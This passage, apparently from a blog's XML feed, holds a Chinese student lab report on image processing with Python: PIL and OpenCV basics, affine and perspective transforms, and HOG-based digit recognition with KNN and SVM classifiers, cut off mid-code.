6535e130c94767a25dde2dfbee4011c1938c1c24f639bf4c8191232973d8d7b2e589b7ec8e2b612132f372a7324c872a7ed55a80c9a8bd9c2fbb2e014aec5de309da4687549b166ee4d9a3f49433634757347588b8d9d7966895adf8dacc244e50f932f7af70bbf246a67f535de4c8c2d07d75bf22a4ab16abad98c7f3a4fbdacc6e2197fc5c7e2af30280653928590af35918237306f162e2d207de7807c8356bd1470fcd588cb04d9ae4d80699f684595f7d3c5bbc1b5b569f0b0c8537f53534b615c949e93e2b87d95c56d08cc07396d9e66963aee40123da950c4dc9f8039fa91448065c789fe74bcf5fbaf9bef0a0dc4b57b23784d9bfbfc034f8d8d34458eaa5e9b955df27c9ca9fdef6fc026e600806092c9a192b3d9f4091f4927dc78654e770fabb7267d6ea37c85fb194c1209803dfa113abcd261ec909938fdaf31</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>信安内容实验3</title>
    <url>/2020/05/03/2020-05-03-information-security-exp-3/</url>
    <content><![CDATA[<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200505202005599.png" alt="image-20200505202005599"></p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="1、图像实验"><a href="#1、图像实验" class="headerlink" title="1、图像实验"></a>1、图像实验</h1><h2 id="1-1-背景介绍"><a href="#1-1-背景介绍" class="headerlink" title="1.1 背景介绍"></a>1.1 背景介绍</h2><p>本次实验，主要熟悉图像的python库操作，仿射变换的学习，以及图像的基本聚类分类方法。</p>
<h3 id="（1）图像的基本知识"><a href="#（1）图像的基本知识" class="headerlink" title="（1）图像的基本知识"></a>（1）图像的基本知识</h3><p>通常情况下，计算机中图像是一个三维数组，维度分别是高度、宽度和像素RGB值。</p>
<p>RGB色彩模式，即每个像素点的颜色由红(R)、绿(G)、蓝(B)组成，RGB三个颜色通道的变化和叠加得到各种颜色，其中每个通道值为0~255。</p>
<h3 id="（2）库介绍"><a href="#（2）库介绍" class="headerlink" title="（2）库介绍"></a>（2）库介绍</h3><ul>
<li><p>NumPy是一个开源的Python科学计算基础库。</p>
<p>N维数组对象：ndarray</p>
<ul>
<li>数组对象可以去掉<strong>元素间运算</strong>所需的循环，使一维向量更像单个数据</li>
<li>设置专门的数组对象，经过优化，可以提升这类应用的运算速度</li>
</ul>
</li>
<li><p>PIL库（Python Image Library）Python中图像处理最常用的库</p>
<p>PIL库是一个具有强大图像处理能力的第三方库。</p>
<p>PILLOW官方文档：<a href="https://pillow.readthedocs.io/en/latest/reference/Image.html" target="_blank" rel="noopener">https://pillow.readthedocs.io/en/latest/reference/Image.html</a></p>
<p>中文博客：<a href="http://blog.csdn.net/column/details/pythonpil.html?&amp;page=1" target="_blank" rel="noopener">http://blog.csdn.net/column/details/pythonpil.html?&amp;page=1</a></p>
</li>
<li><p>OpenCV：是计算机视觉领域应用最广泛的开源工具包。</p>
<p>基于C/C++，支持Linux/Windows/MacOS/Android/iOS，并提供了Python，Matlab和Java等语言的接口，因为其丰富的接口，优秀的性能和商业友好的使用许可，不管是学术界还是业界中都非常受欢迎。OpenCV旨在提供一个用于计算机视觉的科研和商业应用的高性能通用库。</p>
<p>Anaconda命令行安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install --channel https:&#x2F;&#x2F;conda.anaconda.org&#x2F;menpo opencv3</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="3-图像的基本操作"><a href="#3-图像的基本操作" class="headerlink" title="(3)图像的基本操作"></a>(3)图像的基本操作</h3><p><strong>图像的表示</strong></p>
<h4 id="1-将彩色RGB图片变为黑白（灰度）图片"><a href="#1-将彩色RGB图片变为黑白（灰度）图片" class="headerlink" title="1.将彩色RGB图片变为黑白（灰度）图片"></a>1.将彩色RGB图片变为黑白（灰度）图片</h4><p>灰度转换公式：L = R * 299/1000 + G * 587/1000+ B * 114/1000</p>
<p>PIL中，灰度表示模式为L模式，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">'1.jpg'</span>)</span><br><span class="line">im_l = im.convert(<span class="string">"L"</span>)</span><br><span class="line">im_1.show()</span><br><span class="line">im_l.save(<span class="string">'output1.jpg’)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174904801.png" alt="image-20200504174904801"></p>
<h4 id="2-将彩色RGB图片变为“底片”模式"><a href="#2-将彩色RGB图片变为“底片”模式" class="headerlink" title="2.将彩色RGB图片变为“底片”模式"></a>2.将彩色RGB图片变为“底片”模式</h4><p>PIL中，当需要更个性化的图片时，可配合使用numpy,对图像中的数据进行操作将原图以灰度打开后，取反码（b=255-a）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.array(Image.open(<span class="string">"1.jpg"</span>).convert(<span class="string">'L'</span>))</span><br><span class="line">b = <span class="number">255</span> - a</span><br><span class="line">im = Image.fromarray(b.astype(<span class="string">'uint8'</span>))</span><br><span class="line">im.save(<span class="string">"output3.jpg"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174823310.png" alt="image-20200504174823310"></p>
<h4 id="3-滤波器提取图片的信息"><a href="#3-滤波器提取图片的信息" class="headerlink" title="3.滤波器提取图片的信息"></a>3.滤波器提取图片的信息</h4><p>PIL的ImageFilter模块提供了滤波器相关定义，这些滤波器主要用于Image类的filter()方法。</p>
<p>例如，提取图片的轮廓信息：使用ImageFilter.CONTOU</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFilter</span><br><span class="line">a = Image.open(<span class="string">'5.jpg'</span>)</span><br><span class="line">b = </span><br><span class="line">a.filter(ImageFilter.CONTOUR)</span><br><span class="line">b.save(<span class="string">"output5.jpg"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504174832839.png" alt="image-20200504174832839"></p>
<h4 id="4-图片读、写和显示操作"><a href="#4-图片读、写和显示操作" class="headerlink" title="4.图片读、写和显示操作"></a>4.图片读、写和显示操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="comment">#读图片（有多种模式）</span></span><br><span class="line"><span class="comment"># Load an color image in grayscale</span></span><br><span class="line">img = cv.imread(‘lena.jpg’,<span class="number">0</span>) <span class="comment">#显示图片</span></span><br><span class="line">cv.imshow(‘image’,img) <span class="comment">#第一个参数定义窗口名</span></span><br><span class="line">cv.waitKey(<span class="number">0</span>) <span class="comment">#无限制的等待用户的按键</span></span><br><span class="line">cv.destroyAllWindows()</span><br><span class="line"><span class="comment">#写</span></span><br><span class="line">cv.imwrite(‘graylena.png<span class="string">',img)</span></span><br><span class="line"><span class="string">           import cv2 as cv</span></span><br><span class="line"><span class="string">img = cv.imread('</span>lena.jpg’)</span><br><span class="line"><span class="comment">#图片的相关属性</span></span><br><span class="line">print(img.shape) <span class="comment">#高度×宽度×通道数（灰度图只返回前两项）</span></span><br><span class="line">print(img.size) <span class="comment">#像素总数</span></span><br><span class="line">print(img.dtype) <span class="comment">#图像数据类型</span></span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(512, 512, 3)</span><br><span class="line">786432</span><br><span class="line">uint8</span><br></pre></td></tr></table></figure>



<h4 id="5-图像缩放"><a href="#5-图像缩放" class="headerlink" title="5.图像缩放"></a>5.图像缩放</h4><p><strong>cv2.resize(src, dsize, dst, fx=0, fy=0, interpolation=INTER_LINEAR )</strong> </p>
<h2 id="1-2-图像的仿射变换之图像缩放"><a href="#1-2-图像的仿射变换之图像缩放" class="headerlink" title="1.2 图像的仿射变换之图像缩放"></a>1.2 图像的仿射变换之图像缩放</h2><p><strong>仿射变换原理：</strong></p>
<p>在仿射变换中，原始图像中的所有平行线仍将在输出图像中平行。 </p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175530141.png" alt="image-20200504175530141"></p>
<p>为了找到变换矩阵，我们需要输入图像中的三个点及其在输出图像中的相应位置。</p>
<p><strong>仿射变换矩阵：</strong></p>
<p>一个任意的仿射变换都能表示为 <em>乘以一个矩阵</em> (线性变换) 接着再 <em>加上一个向量</em> (平移).</p>
<ul>
<li>旋转 (线性变换) 、平移 (向量加) 、缩放操作 (线性变换)</li>
</ul>
<p>我们通常使用 2 x 3 矩阵来表示仿射变换.其中左边的2×2子矩阵是线性变换矩阵，右边的2×1的</p>
<p>两项是平移项：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175115434.png" alt="image-20200504175115434"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175134255.png" alt="image-20200504175134255"></p>
<p>宽度方向是x，高度方向是y，坐标的顺序和图像像素对应下标一致。</p>
<p>所以原点的位置不是左下角而是左上角，y的方向也不是向上，而是向下。</p>
<p>对于图像上的<strong>任一位置(x,y)</strong>，仿射变换执行的是如下的操作：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504175150544.png" alt="image-20200504175150544"></p>
<p>使用<code>cv.getAffineTransform()</code>将创建一个2x3矩阵，将该矩阵传递给<code>cv.warpAffine()</code>得到结果。</p>
<p>仿射变换进行图像缩放，<strong>代码</strong>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="comment">#加载图片</span></span><br><span class="line">img = cv.imread(<span class="string">'lena.jpg'</span>,<span class="number">0</span>)</span><br><span class="line">rows,cols = img.shape</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据三点的横纵坐标均缩小一倍计算仿射变换</span></span><br><span class="line">pts1 = np.float32([[<span class="number">50</span>,<span class="number">50</span>],[<span class="number">200</span>,<span class="number">50</span>],[<span class="number">50</span>,<span class="number">200</span>]])</span><br><span class="line">pts2=pts1/<span class="number">2</span> <span class="comment"># np.float32([[25,25],[100,25],[25,100]])</span></span><br><span class="line"><span class="comment">#获得仿射变换矩阵</span></span><br><span class="line">M = cv.getAffineTransform(pts1,pts2)</span><br><span class="line"><span class="comment">#warpAffine长宽的一半（int）</span></span><br><span class="line">Affine_scale = cv.warpAffine(img,M,((int)(rows/<span class="number">2</span>),(int)(cols/<span class="number">2</span>)))</span><br><span class="line">cv.imshow(<span class="string">'Raw'</span>,img)</span><br><span class="line">cv.imshow(<span class="string">'Affine_scale'</span>,Affine_scale)</span><br><span class="line">cv.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>结果如下：</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504173747162.png" alt="image-20200504173747162"></p>
<h2 id="1-3-图像的透视变换（空间变换）"><a href="#1-3-图像的透视变换（空间变换）" class="headerlink" title="1.3 图像的透视变换（空间变换）"></a>1.3 图像的透视变换（空间变换）</h2><p>对于透视变换，需要一个3x3变换矩阵。在转换之后，直线仍将保持笔直。</p>
<p>要找到此变换矩阵，输入图像上需要4个点，输出图像上需要相应的。在这4个点中，其中3个不应该共线。</p>
<p>通过函数<code>cv2.getPerspectiveTransform</code>找到变换矩阵，将该矩阵传递给<code>cv2.warpPerspective</code>得到结果。</p>
<p><strong>Tips</strong>：<br>仿射变换和透视变换更直观的叫法可以叫做“平面变换”和“空间变换”或者“二维坐标变换”和“三维坐标变换”。<br>从另一个角度也能说明三维变换和二维变换的意思，仿射变换的方程组有6个未知数，所以要求解就需要找到3组映射点，三个点刚好确定一个平面。透视变换的方程组有8个未知数，所以要求解就需要找到4组映射点，四个点就刚好确定了一个三维空间。</p>
<p><strong>参考资料：</strong></p>
<p><a href="https://segmentfault.com/a/1190000015645951" target="_blank" rel="noopener">opencv python 图像缩放/图像平移/图像旋转/仿射变换/透视变换</a></p>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab  <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">'img6.jpg'</span>)</span><br><span class="line">rows,cols,ch = img.shape</span><br><span class="line"></span><br><span class="line">pts1 = np.float32([[<span class="number">56</span>,<span class="number">65</span>],[<span class="number">368</span>,<span class="number">52</span>],[<span class="number">28</span>,<span class="number">387</span>],[<span class="number">389</span>,<span class="number">390</span>]])</span><br><span class="line">pts2 = np.float32([[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">300</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">300</span>],[<span class="number">300</span>,<span class="number">300</span>]])</span><br><span class="line"></span><br><span class="line">M = cv2.getPerspectiveTransform(pts1,pts2)</span><br><span class="line"></span><br><span class="line">dst = cv2.warpPerspective(img,M,(<span class="number">300</span>,<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">121</span>),plt.imshow(img),plt.title(<span class="string">'Input'</span>)</span><br><span class="line">plt.subplot(<span class="number">122</span>),plt.imshow(dst),plt.title(<span class="string">'Output'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><strong>结果如下：</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504173711245.png" alt="image-20200504173711245"></p>
<h2 id="1-4-通过HOG特征来分类——OCR"><a href="#1-4-通过HOG特征来分类——OCR" class="headerlink" title="1.4 通过HOG特征来分类——OCR"></a>1.4 通过HOG特征来分类——OCR</h2><p><strong>OCR：</strong> </p>
<p>（Optical Character Recognition，光学字符识别）是指电子设备（例如扫描仪或数码相机）检查纸上打印的字符，通过检测暗、亮的模式确定其形状，然后用字符识别方法将形状翻译成计算机文字的过程；即，对文本资料进行扫描，然后对图像文件进行分析处理，获取文字及版面信息的过程。</p>
<p><strong>一般流程如下：</strong></p>
<blockquote>
<p> 图像文件输入 → 图像特征提取 → 分类器训练 → 预测 → 识别结果输出→ 计算正确率 → …</p>
</blockquote>
<p><strong>HOG方向梯度直方图：</strong></p>
<p>（Histogram of Oriented Gradient, HOG）特征是一种在计算机视觉和图像处理中用来进行物体检测的特征描述子。它通过计算和统计图像局部区域的梯度方向直方图来构成特征。HOG特征结合SVM分类器已经被广泛应用于图像识别中，尤其在行人检测中获得了极大的成功。</p>
<p>HOG步骤如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HOG特征提取方法就是将一个image（你要检测的目标或者扫描窗口）：</span><br><span class="line"><span class="number">1</span>）灰度化（将图像看做一个x,y,z（灰度）的三维图像）；</span><br><span class="line"><span class="number">2</span>）采用Gamma校正法对输入图像进行颜色空间的标准化（归一化）；目的是调节图像的对比度，降低图像局部的阴影和光照变化所造成的影响，同时可以抑制噪音的干扰；</span><br><span class="line"><span class="number">3</span>）计算图像每个像素的梯度（包括大小和方向）；主要是为了捕获轮廓信息，同时进一步弱化光照的干扰。</span><br><span class="line"><span class="number">4</span>）将图像划分成小cells（例如<span class="number">10</span>*<span class="number">10</span>像素/cell）；</span><br><span class="line"><span class="number">5</span>）统计每个cell的梯度直方图（不同梯度的个数），即可形成每个cell的descriptor； <span class="number">6</span>）将每几个cell组成一个block（例如<span class="number">2</span>*<span class="number">2</span>个cell/block），一个block内所有cell的特征descriptor串联起来便得到该block的HOG特征descriptor。 <span class="number">7</span>）将图像image内的所有block的HOG特征descriptor串联起来就可以得到该image（你要检测的目标）的HOG特征descriptor了。这个就是最终的可供分类使用的特征向量了。</span><br></pre></td></tr></table></figure>



<p>这次实验用的是一张图的数据集（digits.png）来训练：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504180152299.png" alt="image-20200504180152299"></p>
<p>原代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SVM and KNearest digit recognition.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sample loads a dataset of handwritten digits from '../data/digits.png'.</span></span><br><span class="line"><span class="string">Then it trains a SVM and KNearest classifiers on it and evaluates</span></span><br><span class="line"><span class="string">their accuracy.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Following preprocessing is applied to the dataset:</span></span><br><span class="line"><span class="string"> - Moment-based image deskew (see deskew())</span></span><br><span class="line"><span class="string"> - Digit images are split into 4 10x10 cells and 16-bin</span></span><br><span class="line"><span class="string">   histogram of oriented gradients is computed for each</span></span><br><span class="line"><span class="string">   cell</span></span><br><span class="line"><span class="string"> - Transform histograms to space with Hellinger metric (see [1] (RootSIFT))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[1] R. Arandjelovic, A. Zisserman</span></span><br><span class="line"><span class="string">    "Three things everyone should know to improve object retrieval"</span></span><br><span class="line"><span class="string">    http://www.robots.ox.ac.uk/~vgg/publications/2012/Arandjelovic12/arandjelovic12.pdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">   digits.py</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 2/3 compatibility</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment"># built-in modules</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"></span><br><span class="line"><span class="comment"># local modules</span></span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> clock, mosaic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">20</span> <span class="comment"># size of each digit is SZ x SZ</span></span><br><span class="line">CLASS_N = <span class="number">10</span></span><br><span class="line">DIGITS_FN = <span class="string">'../data/digits.png'</span></span><br><span class="line"><span class="comment">#分割并且每张图缩放为20*20</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split2d</span><span class="params">(img, cell_size, flatten=True)</span>:</span></span><br><span class="line">    h, w = img.shape[:<span class="number">2</span>]</span><br><span class="line">    sx, sy = cell_size</span><br><span class="line">    cells = [np.hsplit(row, w//sx) <span class="keyword">for</span> row <span class="keyword">in</span> np.vsplit(img, h//sy)]</span><br><span class="line">    cells = np.array(cells)</span><br><span class="line">    <span class="keyword">if</span> flatten:</span><br><span class="line">        cells = cells.reshape(<span class="number">-1</span>, sy, sx)</span><br><span class="line">    <span class="keyword">return</span> cells</span><br><span class="line"><span class="comment">#加载digits数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_digits</span><span class="params">(fn)</span>:</span></span><br><span class="line">    print(<span class="string">'loading "%s" ...'</span> % fn)</span><br><span class="line">    digits_img = cv.imread(fn, <span class="number">0</span>)</span><br><span class="line">    digits = split2d(digits_img, (SZ, SZ))</span><br><span class="line">    labels = np.repeat(np.arange(CLASS_N), len(digits)/CLASS_N)</span><br><span class="line">    <span class="keyword">return</span> digits, labels</span><br><span class="line"><span class="comment">#纠正图片倾斜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deskew</span><span class="params">(img)</span>:</span></span><br><span class="line">    m = cv.moments(img)</span><br><span class="line">    <span class="keyword">if</span> abs(m[<span class="string">'mu02'</span>]) &lt; <span class="number">1e-2</span>:</span><br><span class="line">        <span class="keyword">return</span> img.copy()</span><br><span class="line">    skew = m[<span class="string">'mu11'</span>]/m[<span class="string">'mu02'</span>]</span><br><span class="line">    M = np.float32([[<span class="number">1</span>, skew, <span class="number">-0.5</span>*SZ*skew], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line">    img = cv.warpAffine(img, M, (SZ, SZ), flags=cv.WARP_INVERSE_MAP | cv.INTER_LINEAR)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="comment">#模型的加载和保存</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StatModel</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, fn)</span>:</span></span><br><span class="line">        self.model.load(fn)  <span class="comment"># Known bug: https://github.com/opencv/opencv/issues/4969</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, fn)</span>:</span></span><br><span class="line">        self.model.save(fn)</span><br><span class="line"><span class="comment">#knn分类器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KNearest</span><span class="params">(StatModel)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, k = <span class="number">3</span>)</span>:</span></span><br><span class="line">        self.k = k</span><br><span class="line">        self.model = cv.ml.KNearest_create()</span><br><span class="line">    <span class="comment">#训练</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(self, samples, responses)</span>:</span></span><br><span class="line">        self.model.train(samples, cv.ml.ROW_SAMPLE, responses)</span><br><span class="line">    <span class="comment">#评估</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(self, samples)</span>:</span></span><br><span class="line">        _retval, results, _neigh_resp, _dists = self.model.findNearest(samples, self.k)</span><br><span class="line">        <span class="keyword">return</span> results.ravel()</span><br><span class="line"><span class="comment">#SVM分类器训练</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SVM</span><span class="params">(StatModel)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, C = <span class="number">1</span>, gamma = <span class="number">0.5</span>)</span>:</span></span><br><span class="line">        self.model = cv.ml.SVM_create()</span><br><span class="line">        self.model.setGamma(gamma)</span><br><span class="line">        self.model.setC(C)</span><br><span class="line">        self.model.setKernel(cv.ml.SVM_RBF)</span><br><span class="line">        self.model.setType(cv.ml.SVM_C_SVC)</span><br><span class="line">    <span class="comment">#训练</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(self, samples, responses)</span>:</span></span><br><span class="line">        self.model.train(samples, cv.ml.ROW_SAMPLE, responses)</span><br><span class="line">    <span class="comment">#评估</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(self, samples)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.model.predict(samples)[<span class="number">1</span>].ravel()</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试集评估模型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_model</span><span class="params">(model, digits, samples, labels)</span>:</span></span><br><span class="line">    resp = model.predict(samples)</span><br><span class="line">    err = (labels != resp).mean()</span><br><span class="line">    print(<span class="string">'error: %.2f %%'</span> % (err*<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    confusion = np.zeros((<span class="number">10</span>, <span class="number">10</span>), np.int32)</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(labels, resp):</span><br><span class="line">        confusion[i, int(j)] += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'confusion matrix:'</span>)</span><br><span class="line">    print(confusion)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    vis = []</span><br><span class="line">    <span class="keyword">for</span> img, flag <span class="keyword">in</span> zip(digits, resp == labels):</span><br><span class="line">        img = cv.cvtColor(img, cv.COLOR_GRAY2BGR)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            img[...,:<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">        vis.append(img)</span><br><span class="line">    <span class="keyword">return</span> mosaic(<span class="number">25</span>, vis)</span><br><span class="line"><span class="comment">#简单预处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_simple</span><span class="params">(digits)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> np.float32(digits).reshape(<span class="number">-1</span>, SZ*SZ) / <span class="number">255.0</span></span><br><span class="line"><span class="comment">#hog特征计算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_hog</span><span class="params">(digits)</span>:</span></span><br><span class="line">    samples = []</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> digits:</span><br><span class="line">        gx = cv.Sobel(img, cv.CV_32F, <span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#sobel算子边缘检测 一阶差分滤波器</span></span><br><span class="line">        gy = cv.Sobel(img, cv.CV_32F, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        mag, ang = cv.cartToPolar(gx, gy)  <span class="comment">#极坐标变换 （模 角度）</span></span><br><span class="line">        bin_n = <span class="number">16</span>  <span class="comment">#区间数</span></span><br><span class="line">        bin = np.int32(bin_n*ang/(<span class="number">2</span>*np.pi))</span><br><span class="line">        bin_cells = bin[:<span class="number">10</span>,:<span class="number">10</span>], bin[<span class="number">10</span>:,:<span class="number">10</span>], bin[:<span class="number">10</span>,<span class="number">10</span>:], bin[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        mag_cells = mag[:<span class="number">10</span>,:<span class="number">10</span>], mag[<span class="number">10</span>:,:<span class="number">10</span>], mag[:<span class="number">10</span>,<span class="number">10</span>:], mag[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        hists = [np.bincount(b.ravel(), m.ravel(), bin_n) <span class="keyword">for</span> b, m <span class="keyword">in</span> zip(bin_cells, mag_cells)]    <span class="comment">#统计梯度直方图</span></span><br><span class="line">        hist = np.hstack(hists)</span><br><span class="line">        <span class="comment"># transform to Hellinger kernel  to quantify the similarity of two probability distributions</span></span><br><span class="line">        eps = <span class="number">1e-7</span></span><br><span class="line">        hist /= hist.sum() + eps</span><br><span class="line">        hist = np.sqrt(hist)</span><br><span class="line">        hist /= norm(hist) + eps</span><br><span class="line"></span><br><span class="line">        samples.append(hist)</span><br><span class="line">    <span class="keyword">return</span> np.float32(samples)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(__doc__)</span><br><span class="line"></span><br><span class="line">    digits, labels = load_digits(DIGITS_FN) <span class="comment">#图像切分 导入</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'preprocessing...'</span>)</span><br><span class="line">    <span class="comment"># shuffle digits</span></span><br><span class="line">    rand = np.random.RandomState(<span class="number">321</span>)   <span class="comment">#随机种子321</span></span><br><span class="line">    shuffle = rand.permutation(len(digits))</span><br><span class="line">    digits, labels = digits[shuffle], labels[shuffle]   <span class="comment">#打乱数字顺序</span></span><br><span class="line"></span><br><span class="line">    digits2 = list(map(deskew, digits)) <span class="comment">#纠正图片倾斜</span></span><br><span class="line">    samples = preprocess_hog(digits2)   <span class="comment">#计算hog特征</span></span><br><span class="line"></span><br><span class="line">    train_n = int(<span class="number">0.9</span>*len(samples)) <span class="comment">#划分训练测试集</span></span><br><span class="line">    print(train_n)</span><br><span class="line">    cv.imshow(<span class="string">'test set'</span>, mosaic(<span class="number">25</span>, digits[train_n:]))<span class="comment">#展示划分出来的测试数据集</span></span><br><span class="line">    digits_train, digits_test = np.split(digits2, [train_n])<span class="comment">#图像数据</span></span><br><span class="line">    samples_train, samples_test = np.split(samples, [train_n])<span class="comment">#特征数据</span></span><br><span class="line">    labels_train, labels_test = np.split(labels, [train_n])<span class="comment">#标签分割</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'training KNearest...'</span>)   <span class="comment">#knn分类器</span></span><br><span class="line">    model = KNearest(k=<span class="number">4</span>)</span><br><span class="line">    model.train(samples_train, labels_train)</span><br><span class="line">    vis = evaluate_model(model, digits_test, samples_test, labels_test)</span><br><span class="line">    cv.imshow(<span class="string">'KNearest test'</span>, vis)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'training SVM...'</span>)    <span class="comment">#SVM分类器</span></span><br><span class="line">    model = SVM(C=<span class="number">2.67</span>, gamma=<span class="number">5.383</span>)</span><br><span class="line">    model.train(samples_train, labels_train)</span><br><span class="line">    vis = evaluate_model(model, digits_test, samples_test, 